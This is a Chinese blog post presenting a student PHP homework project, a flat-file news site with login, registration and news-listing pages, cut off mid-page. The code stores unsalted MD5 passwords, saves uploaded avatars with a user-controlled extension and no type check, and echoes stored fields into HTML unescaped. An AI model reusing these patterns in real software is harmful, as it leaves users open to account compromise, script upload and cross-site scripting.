    <content type="html"><![CDATA[<p>这是一个作业</p><a id="more"></a><p>结构:</p><p>basedir:存放上下界面</p><p>​                header.php 上</p><p>​                footer.php下</p><p>data:存放新闻用户信息</p><p>​                tupian 存放所有图片</p><p>​                xinwenwenjian存放所有新闻的信息</p><p>​                yonghuxinxiwenjian存放所有新闻文件</p><p>lib:存放功能界面</p><p>​                index.php 主页包含界面</p><p>​                login.php登陆界面</p><p>​                register.php注册前端</p><p>​                registerhoutai.php注册后端</p><p>​                shanchuxinwen.php 删除新闻前端</p><p>​                shanchuxinwenhouduan.php删除新闻后端</p><p>​                shanchuangtouxiang.php 上传头像前端</p><p>​                shanchuangtouxianghoutai.php上传头像后端</p><p>​                xinwenzhanshi.php新闻展示界面</p><p>​                xinwenzhanshimore.php新闻展示更多信息</p><p>​                xiugaimima.php 修改密码前端</p><p>​                xiugaimimamore.php 修改密码后端</p><p>​                yonghutuichu.php 用户退出后端</p><p>​                zengjiaxinwen.php 增加新闻前端</p><p>​                zengjiaxinwenhoutai.php增加新闻后端</p><h1 id="主页包含界面："><a href="#主页包含界面：" class="headerlink" title="主页包含界面："></a>主页包含界面：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">Require_once</span> <span class="string">'../basedir/header.php'</span>;<span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span><span class="keyword">Require_once</span> <span class="string">"xinwenzhanshi.php"</span>;<span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span><span class="keyword">Require_once</span> <span class="string">'../basedir/footer.php'</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="登陆界面"><a href="#登陆界面" class="headerlink" title="登陆界面"></a>登陆界面</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Require_once</span> <span class="string">'../basedir/header.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;!DOCTYPE html&gt;</span><br><span class="line">    &lt;html&gt;</span><br><span class="line">    &lt;head &gt; &lt;meta charset=<span class="string">"utf-8"</span>&gt;&lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;hr&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div style=<span class="string">"width:100%;text-align:center"</span>&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">    &lt;h1&gt;骚年输入的你的编号&lt;/h1&gt;</span><br><span class="line">    &lt;form action=<span class="string">"login.php"</span> method=<span class="string">"post"</span> &gt;</span><br><span class="line">        &lt;p&gt;&lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span> placeholder=<span class="string">"手机号/邮箱/用户名"</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;&lt;input type=<span class="string">"password"</span> name=<span class="string">"passwd"</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;&lt;input class="input_code" type="text" name="verifycode" placeholder="验证码"&gt;&lt;/p&gt;</span><br><span class="line">        &lt;img class="verifycode" src="https://passport.360.cn/captcha.php?m=create&amp;app=i360&amp;scene=login&amp;userip=&amp;level=default&amp;sign=8820a4&amp;r=1564540365&amp;border=none&amp;_=1564540365972"&gt;</span><br><span class="line"></span><br><span class="line">        &lt;p&gt;&lt;input type=<span class="string">"submit"</span> name=<span class="string">"提交"</span>&gt;&lt;/p&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td align=<span class="string">"right"</span>&gt;</span><br><span class="line">                &lt;a href=<span class="string">"../lib/register.php"</span>&gt;&lt;button  align=<span class="string">"right"</span>&gt;用户注册&lt;/button&gt;&lt;/a&gt;</span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">    &lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Require_once</span> <span class="string">'../basedir/footer.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL^E_NOTICE);</span><br><span class="line"></span><br><span class="line">$uname = base64_encode($_POST[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">$upass = md5($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($uname &amp;&amp; $upass)&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    echo base64_decode($uname);</span></span><br><span class="line"></span><br><span class="line">    $f = fopen(<span class="string">'../data/yonghuxinxiwenjian/yh.db'</span>,<span class="string">'r'</span>);</span><br><span class="line">    <span class="keyword">while</span> (!feof($f))&#123;</span><br><span class="line">        $data = fgets($f);</span><br><span class="line">        $arr = explode(<span class="string">'|'</span>,$data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(count($arr) !=<span class="number">4</span> )&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        echo base64_decode($arr[0]);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($arr[<span class="number">0</span>] == $uname &amp;&amp; $arr[<span class="number">1</span>] == $upass)&#123;</span><br><span class="line"></span><br><span class="line">            $idd = base64_decode($arr[<span class="number">0</span>]);</span><br><span class="line">            session_start();</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>]=$idd;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('登陆成功！将跳转到主页！');location.href='index.php';&lt;/script&gt;"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('用户名或者密码错误，请重新登录！');location.href='login.php';&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="注册功能"><a href="#注册功能" class="headerlink" title="注册功能"></a>注册功能</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">前端</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">Require_once &apos;../basedir/header.php&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;hr&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;快来和我一起欢乐&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style=&quot;width:100%;text-align:center&quot;&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;registerhoutai.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;h3&gt;&lt;p&gt;用户名&lt;/p&gt;&lt;/h3&gt;</span><br><span class="line">    &lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;/p&gt;</span><br><span class="line">    &lt;h3&gt;&lt;p&gt;密码&lt;/p&gt;&lt;/h3&gt;</span><br><span class="line">    &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;passwd&quot;&gt;&lt;/p&gt;</span><br><span class="line">    &lt;h3&gt;&lt;p&gt;再次确认密码&lt;/p&gt;&lt;/h3&gt;</span><br><span class="line">    &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;passwd2&quot;&gt;&lt;/p&gt;</span><br><span class="line">    &lt;h3&gt;&lt;p&gt;输入你的邮箱&lt;/p&gt;&lt;/h3&gt;</span><br><span class="line">    &lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;youxiang&quot;&gt;&lt;/p&gt;</span><br><span class="line">    &lt;h3&gt;&lt;p&gt;上传你的头像&lt;/p&gt;&lt;/h3&gt;</span><br><span class="line">    &lt;p&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;提交&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">Require_once &apos;../basedir/footer.php&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>删除新闻功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上传头像功能</p><h1 id="新闻展示界面："><a href="#新闻展示界面：" class="headerlink" title="新闻展示界面："></a>新闻展示界面：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style &gt;</span><br><span class="line">    .th&#123;</span><br><span class="line">        vertical-align: middle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style=<span class="string">"width:100%;text-align:center"</span>&gt;</span><br><span class="line">    &lt;h1&gt;新闻界面&lt;/h1&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;hr&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">error_reporting(E_ALL^E_NOTICE);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">        &lt;table align="center" width="600"&gt;</span></span><br><span class="line"><span class="string">        &lt;tr &gt;&lt;th id="sctx"&gt;&lt;a href="shangchuantouxiang.php"&gt;上传头像&lt;/a&gt;&lt;/th&gt;&lt;th id="zjxw"&gt;&lt;a href="zengjiaxinwen.php"&gt;增加新闻&lt;/a&gt;&lt;/th&gt;&lt;th id="scxw"&gt;&lt;a href="shanchuxinwen.php"&gt;删除新闻&lt;/th&gt;&lt;th id="xgmm"&gt;&lt;a href="xiugaimima.php"&gt;修改密码&lt;/th&gt;&lt;/tr&gt;</span></span><br><span class="line"><span class="string">        &lt;/table&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;table align=<span class="string">"center"</span> border=<span class="string">"1"</span> width=<span class="string">"1200"</span>&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th&gt; &lt;h2&gt;热度&lt;/h2&gt; &lt;/th&gt;</span><br><span class="line">        &lt;th&gt; &lt;h2&gt;标题&lt;/h2&gt; &lt;/th&gt;</span><br><span class="line">        &lt;th&gt; &lt;h2&gt;作者&lt;/h2&gt; &lt;/th&gt;</span><br><span class="line">        &lt;th&gt; &lt;h2&gt;时间&lt;/h2&gt; &lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    $f = fopen(<span class="string">'../data/xinwenwenjian/new.db'</span>,<span class="string">'r'</span>);</span><br><span class="line">    <span class="keyword">while</span> (!feof($f))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        $str = fgets($f);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        $shuzu = explode(<span class="string">"|"</span>,$str);</span><br><span class="line">        <span class="comment">//echo "长度为：".strlen($shuzu[0]);</span></span><br><span class="line">        <span class="keyword">if</span>(count($shuzu) !=<span class="number">6</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $shuzu = explode(<span class="string">'|'</span>,$str);<span class="comment">//按照|进行分割</span></span><br><span class="line">        $redu = $shuzu[<span class="number">0</span>];</span><br><span class="line">        $biaoti = base64_decode($shuzu[<span class="number">1</span>]);</span><br><span class="line">        $zuozhe = base64_decode($shuzu[<span class="number">2</span>]);</span><br><span class="line">        $shijian = base64_decode($shuzu[<span class="number">3</span>]);</span><br><span class="line">        $tupian = base64_decode($shuzu[<span class="number">4</span>]);</span><br><span class="line">        $jianjie= mb_substr(base64_decode($shuzu[<span class="number">5</span>]),<span class="number">0</span>,<span class="number">150</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">            &lt;tr&gt;</span></span><br><span class="line"><span class="string">            &lt;td align="center"&gt;<span class="subst">&#123;$redu&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">            &lt;td align="center"&gt;<span class="subst">&#123;$biaoti&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">            &lt;td align="center"&gt;<span class="subst">&#123;$zuozhe&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">            &lt;td align="center"&gt;<span class="subst">&#123;$shijian&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">            &lt;/tr&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;tr&gt;</span></span><br><span class="line"><span class="string">            &lt;td align="center" height: 30px; width: 300px; text-align: center;&gt;</span></span><br><span class="line"><span class="string">            &lt;img height="150px" src=<span class="subst">&#123;$tupian&#125;</span> &gt;</span></span><br><span class="line"><span class="string">            &lt;/td&gt;</span></span><br><span class="line"><span class="string">            &lt;td colspan="3" align="center" colspan="3"&gt;&lt;a href="xinwenzhanshimore.php?action=<span class="subst">&#123;$biaoti&#125;</span>"&gt;<span class="subst">&#123;$jianjie&#125;</span>&lt;/a&gt; &lt;/td&gt;</span></span><br><span class="line"><span class="string">            &lt;/tr&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line">后端</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">'passwd'</span>] != $_POST[<span class="string">'passwd2'</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('两次输入的密码不正确')&lt;/script&gt;"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$f = fopen(<span class="string">"../data/yonghuxinxiwenjian/yh.db"</span>,<span class="string">"r"</span>);</span><br><span class="line"><span class="keyword">while</span>(!feof($f))&#123;</span><br><span class="line">    $zifuchuan = fgets($f);</span><br><span class="line">    $zifuchuan = explode(<span class="string">"|"</span>,$zifuchuan);</span><br><span class="line"><span class="comment">//        echo $_POST['name'];</span></span><br><span class="line"><span class="comment">//        echo base64_decode($zifuchuan[0]);</span></span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'name'</span>] == base64_decode($zifuchuan[<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('此账号已被注册');location.href='register.php';&lt;/script&gt;"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$name = base64_encode($_POST[<span class="string">'name'</span>]);</span><br><span class="line">$passwd = md5($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line">$youxiang = base64_encode($_POST[<span class="string">'youxiang'</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$filename=  $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line"></span><br><span class="line">$filehouzui = explode(<span class="string">'.'</span>,$filename); <span class="comment">//根据.来分割</span></span><br><span class="line">$filezhenshiming = $_POST[<span class="string">'name'</span>].<span class="string">'.'</span>.$filehouzui[<span class="number">1</span>];<span class="comment">//将分割出来的后缀和.合并到一起</span></span><br><span class="line">$filebaocunlujing = <span class="string">"../data/yonghuxinxiwenjian/"</span>.$filezhenshiming;<span class="comment">//此处为保存路径</span></span><br><span class="line">move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$filebaocunlujing);</span><br><span class="line">$filebaocunlujing = base64_encode($filebaocunlujing);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$f = fopen(<span class="string">"../data/yonghuxinxiwenjian/yh.db"</span>,<span class="string">"a+"</span>);</span><br><span class="line">$shuju = <span class="string">"$name|$passwd|$youxiang|$filebaocunlujing"</span>.<span class="string">"\n"</span>;</span><br><span class="line">fwrite($f ,$shuju );</span><br><span class="line">fclose($f);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'username'</span>]=$_POST[<span class="string">'name'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('恭喜你注册成功！即将跳转到主面！');location.href='index.php';&lt;/script&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="修改密码功能"><a href="#修改密码功能" class="headerlink" title="修改密码功能"></a>修改密码功能</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line">前端</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">error_reporting(E_ALL^E_NOTICE);</span><br><span class="line">if(!isset($_SESSION[&apos;username&apos;]))&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&apos;请登录后查看！&apos;);location.href=&apos;login.php&apos;;&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">Require_once &apos;../basedir/header.php&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;div style=&quot;width:100%;text-align:center&quot;&gt;</span><br><span class="line">    &lt;h1&gt;修改密码&lt;/h1&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;hr&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_SESSION[&apos;username&apos;]))&#123;</span><br><span class="line">    echo &lt;&lt;&lt;EOF</span><br><span class="line">        &lt;table align=&quot;center&quot; width=&quot;600&quot;&gt;</span><br><span class="line">         &lt;tr &gt;&lt;th id=&quot;sctx&quot;&gt;&lt;a href=&quot;shangchuantouxiang.php&quot;&gt;上传头像&lt;/a&gt;&lt;/th&gt;&lt;th id=&quot;xwjm&quot;&gt;&lt;a href=&quot;zengjiaxinwen.php&quot;&gt;增加新闻&lt;/th&gt;&lt;th id=&quot;scxw&quot;&gt;&lt;a href=&quot;shanchuxinwen.php&quot;&gt;删除新闻&lt;th id=&quot;xgmm&quot;&gt;&lt;a 